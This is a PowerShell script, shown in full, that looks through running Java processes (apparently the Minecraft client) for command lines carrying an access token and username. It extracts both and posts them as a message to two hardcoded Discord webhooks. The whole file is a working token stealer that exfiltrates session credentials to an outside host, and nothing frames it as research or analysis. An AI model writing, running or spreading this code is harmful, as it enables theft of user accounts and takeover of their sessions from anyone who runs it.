$webhookUrls = @(
    "https://discord.com/api/webhooks/1353103114567417906/siV5e9L9b1DbEQfdgMSCoCdrpMbJAW7wMHDwYibneuqHzsmnHMdjOWcFGb_Fgx50tF1j",
    "https://discord.com/api/webhooks/1353282505696084080/4rcy4p7RSP4tVHwFi9NZpnDncMbsCyNXOz3Tc1hgXa65fmzDMr9ERmW8BAKNCFcca5Yr"
)

Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
    Select-Object -ExpandProperty CommandLine |
    ForEach-Object {
        $accessToken = $null
        $username = $null

        if ($_ -match '--accessToken\s+(\S+)') {
            $accessToken = $matches[1]
        }
        if ($_ -match '--username\s+(\S+)') {
            $username = $matches[1]
        }

        if ($accessToken -and $username) {
            $message = @"
> **AccessToken:** $accessToken
> **Username:** $username
"@

            Write-Output $message

            $payload = @{
                content = $message
            } | ConvertTo-Json -Depth 10

            foreach ($webhookUrl in $webhookUrls) {
                Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
            }
        }
    }
